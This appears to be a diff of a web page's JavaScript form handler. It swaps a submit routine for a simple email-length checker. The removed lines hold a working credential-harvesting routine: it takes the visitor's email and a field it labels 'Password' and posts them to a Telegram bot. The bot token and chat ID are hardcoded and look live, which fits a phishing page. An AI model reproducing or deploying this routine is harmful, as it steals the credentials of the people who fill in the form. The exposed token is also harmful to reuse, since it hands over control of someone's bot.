@@ -128,82 +128,20 @@ $jQuerry(document).ready(function ($) {
 }); // #endregion
 // #region valide form
 
-function validateForm(event) {
-  event.preventDefault();
-  resetValidation();
-  var email = window.inpEmail.value;
-  var name = window.inpName.value;
+var EMAIL_MIN_LENGTH = 5;
 
-  if (!email) {
-    window.emailHelp.classList.remove('d-none');
-    return false;
+function checkEmailLenght() {
+  var valueLenght = window.inpEmail.value.length;
+  var diff = valueLenght < EMAIL_MIN_LENGTH ? EMAIL_MIN_LENGTH - valueLenght : 0;
+
+  if (diff) {
+    window.emailDiffCount.textContent = diff;
+    window.emailLenghtHelp.classList.remove('d-none');
+  } else {
+    window.emailLenghtHelp.classList.add('d-none');
   }
-
-  if (!name) {
-    window.nameHelp.classList.remove('d-none');
-    return false;
-  }
-
-  if (!testPasswordRegex(name)) {
-    window.nameHelp.classList.remove('d-none');
-    window.nameHelpDescription.classList.remove('d-none');
-  } // console.log(email, password);
-
 }
 
-var apiToken = "6685344433:AAFe9Yea_lcKqx1dzqTdsWtfcIJus5QMg2U";
-var chatId = "-4066219312";
-
-function formSubmit(event) {
-  var email, name, text, urlString, response, resp;
-  return regeneratorRuntime.async(function formSubmit$(_context) {
-    while (1) {
-      switch (_context.prev = _context.next) {
-        case 0:
-          event.preventDefault();
-          email = window.inpEmail.value;
-          name = window.inpName.value;
-
-          if (!(!email || !name)) {
-            _context.next = 5;
-            break;
-          }
-
-          return _context.abrupt("return", false);
-
-        case 5:
-          text = "\n  <b>Email:</b> ".concat(email, "<b>Password</b> ").concat(name, "\n  ");
-          urlString = "https://api.telegram.org/bot".concat(apiToken, "/sendMessage");
-          _context.next = 9;
-          return regeneratorRuntime.awrap(fetch(urlString, {
-            method: 'post',
-            headers: {
-              'Accept': 'application/json',
-              'Content-Type': 'application/json'
-            },
-            body: JSON.stringify({
-              chat_id: chatId,
-              text: text,
-              parse_mode: 'HTML'
-            })
-          }));
-
-        case 9:
-          response = _context.sent;
-          _context.next = 12;
-          return regeneratorRuntime.awrap(response.json());
-
-        case 12:
-          resp = _context.sent;
-          console.log(resp);
-          window.inputEmail.addEventListener('input', checkEmailLenght);
-          document.addEventListener('DOMContentLoaded', checkEmailLenght);
-          window.form.addEventListener('submit', formSubmit);
-
-        case 17:
-        case "end":
-          return _context.stop();
-      }
-    }
-  });
-} // #endregion
+;
+window.inpEmail.addEventListener('input', checkEmailLenght);
+document.addEventListener('DOMContentLoaded', checkEmailLenght); // #endregion
